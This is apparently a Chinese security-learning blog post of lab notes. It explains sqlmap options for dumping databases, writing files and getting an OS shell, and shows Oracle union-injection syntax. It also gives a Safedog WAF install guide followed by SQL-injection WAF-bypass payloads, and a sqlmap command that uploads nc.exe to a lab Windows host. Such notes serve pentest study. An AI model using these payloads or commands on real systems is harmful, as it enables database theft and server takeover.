+<h3 id="SQLMAP目录介绍"><a href="#SQLMAP目录介绍" class="headerlink" title="SQLMAP目录介绍"></a>SQLMAP目录介绍</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">doc           保护sqlmap的简要说明，具体使用说明，作者信息等。</span><br><span class="line">extra         包含sqlmap的额外功能，如发出声响、允许cmd、安全执行等。</span><br><span class="line">lib           sqlmap核心目录。</span><br><span class="line">plugins       包含了sqlmap目前支持的13种数据库信息和数据库通用事项。</span><br><span class="line">procs         包含了mssql、mysql、oracle、postgresql的触发程序。</span><br><span class="line">shell         包含了注入成功后的9种shell远程命令执行。</span><br><span class="line">tamper        包含了waf绕过脚本。</span><br><span class="line">thirdparty    包含了第三方插件，例如优化，保持连接，颜色。</span><br><span class="line">txt           包含了表名字典，列名字典，UA字典等。</span><br><span class="line">udf           存放攻击载荷。</span><br><span class="line">waf           存放waf特征判断脚本。</span><br><span class="line">xml           存放多种数据库注入检测的payload等信息</span><br></pre></td></tr></table></figure>
+
+<h3 id="SQLMAP特性"><a href="#SQLMAP特性" class="headerlink" title="SQLMAP特性"></a>SQLMAP特性</h3><p><strong>sqlmap支持常见的六种不同的注入模式（不计算其他数据库类型）：</strong></p>
+<p>1、基于布尔盲注，即可以根据返回页面判断条件真假的注入。</p>
+<p>2、基于时间盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p>
+<p>3、基于报错注入、即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>
+<p>4、联合查询注入、可以使用union的情况下的注入。</p>
+<p>5、堆查询注入、可以同时执行多条语句的执行时的注入。</p>
+<p>6、内联查询注入、在sql语句中执行sql语句</p>
+<p><strong>SQLMAP支持的13+种数据库</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali系统 : /user/share/sqlmap/plugins/dbms</span><br></pre></td></tr></table></figure>
+
+<h3 id="SQLMAP基本命令"><a href="#SQLMAP基本命令" class="headerlink" title="SQLMAP基本命令"></a>SQLMAP基本命令</h3><p>1、选项</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap              查看版本</span><br><span class="line">sqlmap -h           显示基本帮助信息并退出</span><br><span class="line">sqlmap -hh          显示高级帮助信息并退出</span><br><span class="line">sqlmap --version    显示程序版本信息并退出</span><br></pre></td></tr></table></figure>
+
+<p>2、目标（Target）</p>
+<blockquote>
+<p>在这些选项中必须提供至少有一个确定目标</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-u &quot;192.168.2.91/sqli/Less-1/?id=1&quot;    目标URL  </span><br><span class="line">-r yakit.txt     可以将一个post请求方式的数据包(bp抓包)保存在一个txt中，sqlmap会通过post方式检测目标。</span><br><span class="line"></span><br><span class="line">-m target.txt    后接一个txt文件，文件中是多个url，sqlmap会自动化的检测其中的所有url。</span><br></pre></td></tr></table></figure>
+
+<p>3、请求（Request）</p>
+<blockquote>
+<p>这些选项可以用来指定如何连接到目标URL</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--method=METHOD    指定请求方法。METHOD:GET,POST</span><br><span class="line">--proxy=PROXY      使用代理连接目标 URL。PROXY:&quot;127.0.0.1:8080&quot;</span><br><span class="line">--data=DATA         通过 POST 发送的数据字符串 (e.g. &quot;id=1&quot;)</span><br><span class="line">--cookie=COOKIE     HTTP Cookie 头值 (e.g. &quot;PHPSESSID=a8d127e..&quot;)</span><br><span class="line">--random-agent     使用随机选择的 HTTP user-agent 头值进行测试。</span><br><span class="line">--tor               使用 Tor 匿名网络</span><br><span class="line">--check-tor         检查 Tor 是否正确使用</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>sqlmap有一个文件中储存了各种各样的user-agent，文件在 <code>sqlmap/txt/user-agent.txt</code> 在level&gt;&#x3D;3时会检测user-agent注入。</p>
+</blockquote>
+<p>4、注入（Injection）</p>
+<blockquote>
+<p>这些选项可用于指定要测试的参数、提供自定义注入有效载荷和可选的篡改脚本。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--tamper=TAMPER     使用sqlmap自带的tamper，或者自己写的tamper，来混淆payload，通常用来绕过waf和ips。</span><br><span class="line">                    SQLmap内置了很多绕过脚本，在 /usr/share/sqlmap/tamper/ 目录下</span><br><span class="line">-p TESTPARAMETER    可测试参数。(例如：sqlmap -r yakit.txt -p &quot;username&quot;)</span><br><span class="line"></span><br><span class="line">--skip-static       跳过测试静态参数(有的时候注入有多个参数，那么有些无关紧要的参数修改后页面是没有变化的)</span><br><span class="line">--no-cast           获取数据时，sqlmap会将所有数据转换成字符串，并用空格代替null。(这个在我们注入失败的时候偶尔会见到，提示尝试使用--no-cast)</span><br><span class="line">--dbms=DBMS         强制后端 DBMS 使用提供的值</span><br></pre></td></tr></table></figure>
+
+<p>5、检测（Detection）</p>
+<blockquote>
+<p>这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--level=LEVEL    要执行的测试级别 (1-5, default 1)</span><br><span class="line">                 lv2:cookie; lv3:user-agent,refere; lv5:host</span><br><span class="line">                 在sqlmap/xml/payloads文件内可以看见各个level发送的payload  我常使用--level 3</span><br><span class="line">                 </span><br><span class="line">--risk=RISK      执行测试的风险 (1-3, default 1)</span><br><span class="line">                 升高风险等级会增加数据被篡改的风险。  常用就是默认1</span><br><span class="line">                 risk 1：会测试大部分的测试语句（默认值）；</span><br><span class="line">                 risk 2：会增加基于时间的测试语句；</span><br><span class="line">                 risk 3：会增加OR语句的SQL注入测试。</span><br></pre></td></tr></table></figure>
+
+<p>6、枚举（Enumeration）</p>
+<blockquote>
+<p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。 脱库时使用</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">-a, --all            检索所有内容</span><br><span class="line">-b, --banner         获取 数据库管理系统(DBMS) 的标识</span><br><span class="line">--current-user       获取 数据库管理系统(DBMS) 当前用户</span><br><span class="line">--current-db         获取 数据库管理系统(DBMS) 当前数据库</span><br><span class="line">--hostname           获取数据库服务器的主机名称</span><br><span class="line">--is-dba             检测DBMS当前用户是否DBA</span><br><span class="line">--users              枚举数据库管理系统用户</span><br><span class="line">--passwords          枚举 数据库管理系统(DBMS) 用户密码哈希</span><br><span class="line">--privileges         枚举数据库管理系统用户的权限</span><br><span class="line">--schema             枚举  数据库管理系统(DBMS)  模式</span><br><span class="line"></span><br><span class="line">--dbs                枚举 数据库管理系统(DBMS) 所有数据库</span><br><span class="line">-D DB                数据库要枚举的数据库 (e.g. security)</span><br><span class="line">--tables             枚举 数据库管理系统(DBMS) 数据库中的所有表</span><br><span class="line">-T TBL               要枚举的 数据库管理系统(DBMS) 数据库表 (e.g. users)</span><br><span class="line">--columns            枚举 数据库管理系统(DBMS) 数据库所有表列</span><br><span class="line">-C COL               要枚举的 数据库管理系统(DBMS) 数据库表列 (e.g. &quot;id,password&quot;)</span><br><span class="line">--dump               转储 数据库管理系统(DBMS) 数据库表项。爆破值 查看字段的所有值</span><br><span class="line"></span><br><span class="line">--dump-all           转储所有 数据库管理系统(DBMS) 数据库表项</span><br><span class="line">--search             搜索列（S），表（S）和/或数据库名称（S）</span><br><span class="line">--sql-query=QUERY    要执行的SQL语句</span><br><span class="line">--sql-shell          提示交互式SQL的shell</span><br></pre></td></tr></table></figure>
+
+<p>7、文件操作</p>
+<blockquote>
+<p>这些选项可以被用来访问后端数据库管理系统的底层文件系统</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--file-read=RFILE		从后端的数据库管理系统文件系统读取文件</span><br><span class="line">--file-write=WFILE		编辑后端的数据库管理系统文件系统上的本地文件</span><br><span class="line">--file-dest=DFILE		后端的数据库管理系统写入文件的绝对路径</span><br></pre></td></tr></table></figure>
+
+<p>在kali中将&#x2F;software&#x2F;nc.exe文件上传到C:&#x2F;WINDOWS&#x2F;Temp下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u&quot;http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1&quot; --file-write=&quot;/software/nc.exe&quot; --file-dest=&quot;C:/WINDOWS/Temp/nc.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>8、操作系统访问（Operating system access）</p>
+<blockquote>
+<p>这些选项可以用于访问后端数据库管理系统的底层操作系统</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--os-cmd=OSCMD      执行操作系统命令（OSCMD）</span><br><span class="line">--os-shell          提示交互式操作系统 shell</span><br><span class="line">--os-pwn            提示使用 OOB shell、Meterpreter 或 VNC</span><br></pre></td></tr></table></figure>
+
+<p>9、一般情况（General）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--batch            绝不要求用户输入，使用默认行为</span><br><span class="line">--flush-session    为当前目标刷新会话文件</span><br></pre></td></tr></table></figure>
+
+<p>10、其它</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Techniques:</span><br><span class="line">    --technique=TECH..  要使用的 SQL 注入技术 (default &quot;BEUSTQ&quot;)</span><br><span class="line">Miscellaneous:</span><br><span class="line">    --wizard            为初学者设计的简单向导界面</span><br></pre></td></tr></table></figure>
+
+<h2 id="Oracle数据库特点？？？"><a href="#Oracle数据库特点？？？" class="headerlink" title="Oracle数据库特点？？？"></a>Oracle数据库特点？？？</h2><h3 id="靶场？？？"><a href="#靶场？？？" class="headerlink" title="靶场？？？"></a>靶场？？？</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- Oracle注入用的</span><br><span class="line">-- https://portswigger.net/web-security/all-labs</span><br></pre></td></tr></table></figure>
+
+<h3 id="Oracle数据库介绍"><a href="#Oracle数据库介绍" class="headerlink" title="Oracle数据库介绍"></a>Oracle数据库介绍</h3><p>Oracle数据库系统是世界上流行的关系数据库管理系统，系统可移植性好、使用方便、功能强，适用于各类大、中、小微机环境。它是一种高效率的、可靠性好的、适应高吞吐量的数据库方案。</p>
+<p>Oracle服务默认端口：1521</p>
+<p>Oracle和MySQL数据库语法大致相同，结构不太相同。</p>
+<h3 id="Oracle和MySQL的语法差异"><a href="#Oracle和MySQL的语法差异" class="headerlink" title="Oracle和MySQL的语法差异"></a>Oracle和MySQL的语法差异</h3><p>Oracle要求select后必须指明要查询的表名，可以用dual。</p>
+<p>在Oracle中每个库中均存在一张dual表，这个表是虚表，并没有实际的存储意义，它永远只存储一条数据，因为Oracle的SQL语法要求select后必须跟上from，所以我们通常使用dual来作为计算、查询时间等SQL语句中from之后的虚表占位。</p>
+<p>’a‘ 必须要和数据的类型一致，负责报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union selecct &#x27;a&#x27;,&#x27;b&#x27; from dual--+</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Oracle使用 || 拼接字符串，MySQL中为或运算。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union selecct &#x27;a&#x27;||&#x27;a&#x27;,&#x27;b&#x27; from dual--+</span><br></pre></td></tr></table></figure>
+
+
+
+<p>单引号和双引号在Oracle中虽然都是字符串，但是双引号可以用来消除关键字，比如sysdate，不能使用保留字作为用户定义的变量，但是当加上双引号就可以。</p>
+<p>Oracle中没有空字符，<code>&#39;&#39;</code>和<code>&#39;null&#39;</code>都是null，而MySQL中认为’’仍然是一个字符串。</p>
+<p>每条 <strong>SELECT</strong> 语句都必须指定从哪个表中选择。</p>
+<p>使用 <strong>UNION</strong> 时，数据类型必须对应。</p>
+<p>查询数据库版本信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT banner, NULL AS empty_column FROM v$version;</span><br><span class="line">-- 这将返回版本信息和一个名为 empty_column 的空列。</span><br></pre></td></tr></table></figure>
+
+<p>注释：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- 单行注释</span><br><span class="line">/* 多行注释 */</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h2 id="安全狗"><a href="#安全狗" class="headerlink" title="安全狗"></a>安全狗</h2><h3 id="安装安全狗教程"><a href="#安装安全狗教程" class="headerlink" title="安装安全狗教程"></a>安装安全狗教程</h3><p>1、环境</p>
+<p>window2016服务器</p>
+<p>phpsutudy版本8.1.1.3</p>
+<p>关掉Apache</p>
+<p>2、Apache加入到系统服务中</p>
+<p>管理员权限打开 <strong>dos命令</strong> 面板，进入 <code>phpstudy_pro\Extensions\Apache2.4.39\bin</code> 文件夹，输入命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpd.exe -k install -n apache2.4</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>安装完成后打开<strong>系统服务列表</strong>查看是否安装成功</p>
+</blockquote>
+<p>3、安装安全狗</p>
+<p>下载：<a target="_blank" rel="noopener" href="https://www.safedog.cn/">安全狗</a> 的免费安全产品，选择 网站 或者 服务器。</p>
+<p>安全前先启动Apache2.4服务，点击安全狗安装包安装，安装目录自定义</p>
+<blockquote>
+<p>如果失败，可能是安全狗安装前先不要开启phpstudy</p>
+</blockquote>
+<blockquote>
+<p>安装完成启动安全狗可能会提示apache插件安装失败，此问题原因是安全狗启动权限不够</p>
+</blockquote>
+<p>用<strong>管理员权限</strong>启动安全狗</p>
+<p>启动后提示apache插件安装完成</p>
+<p>看安全狗这个网站安全狗与防护总开关是否都开启，只有都开启了才有效，此时再去打开phpstudy，一般他就应该是自己变成系统服务了，如果没变的话就再选择一下即可</p>
+<h3 id="绕过安全狗？？？"><a href="#绕过安全狗？？？" class="headerlink" title="绕过安全狗？？？"></a>绕过安全狗？？？</h3><blockquote>
+<p>参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/563904977">从SQL注入绕过最新安全狗WAF中学习fuzz</a> 、 <a target="_blank" rel="noopener" href="https://blog.51cto.com/u_15072903/4074643">WAF绕过方法总结</a></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1=1    =&gt;    true=true</span><br><span class="line"></span><br><span class="line">暴力破解（字符集）: /*!-#</span><br><span class="line">举例：</span><br><span class="line">id=1&#x27; and/*////*/1 --+</span><br><span class="line">id=-1&#x27; union/*/!*!**/select 1,2,3--+</span><br><span class="line">id=-1&#x27; union/*//--**/select 1,2,3--+</span><br><span class="line">id=-1&#x27; union/*/!--**/select 1,2,3--+</span><br><span class="line">id=-1&#x27; union/*/-*!!*/select 1,2,3--+</span><br><span class="line">id=-1&#x27; union/*/!*!**/select 1,2,database/*///-*/()--+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select @@version;      # 5.5.53</span><br><span class="line">select /*!999991*/;</span><br><span class="line">select /*!1*/;</span><br><span class="line">select /*!505531*/;</span><br><span class="line">select /*!505541*/;</span><br><span class="line"></span><br><span class="line">id=-1&#x27; union/*/!*!**/select 1,2,database/*!20553()*/--+</span><br></pre></td></tr></table></figure>
+
+<p>这种注释在mysql中叫做内联注释，如果没有接版本号时，会直接执行里面内容。当!后面接数据库版本号时，如果自身版本号(上述例子中的5.5.53)大于等于字符数(例如上述例子中的99999和00000)，就会将注释中的内容执行，否则就会当做注释来处理。</p>
+<p>那么这里的话，我们就想构造1&#x3D;1，就可以利用它来进行绕过，我们构造如下<code>/*!000001*/=/*!000001*/</code>语句尝试进行绕过</p>
+<p>order by 绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; order/*////*/by 3 --+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; like &quot;[%23]&quot; /*!10440union%0aselect*/ 1,2,3 --+</span><br></pre></td></tr></table></figure>
+
+<p>。。。</p>
+<h2 id="Pikachu靶场？？？"><a href="#Pikachu靶场？？？" class="headerlink" title="Pikachu靶场？？？"></a>Pikachu靶场？？？</h2><p>将 <strong>pikachu-master.zip</strong> 解压到小皮的 <strong>WWW</strong> 目录下。</p>
+<p>在 <strong>pikachu-master</strong> 文件夹下的 inc 目录下的 <strong>config.inc.php</strong> 文件中修改连接数据的信息，例如：密码</p>
+<p>。。。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"># SQL注入</a>
+              <a href="/tags/SQLMap/" rel="tag"># SQLMap</a>
+              <a href="/tags/%E5%AE%89%E5%85%A8%E7%8B%97/" rel="tag"># 安全狗</a>
+              <a href="/tags/pikachu/" rel="tag"># pikachu</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/12/12/Vue/" rel="prev" title="Vue">
+                  <i class="fa fa-angle-left"></i> Vue
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/12/21/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="next" title="信息收集">
+                  信息收集 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">John Doe</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
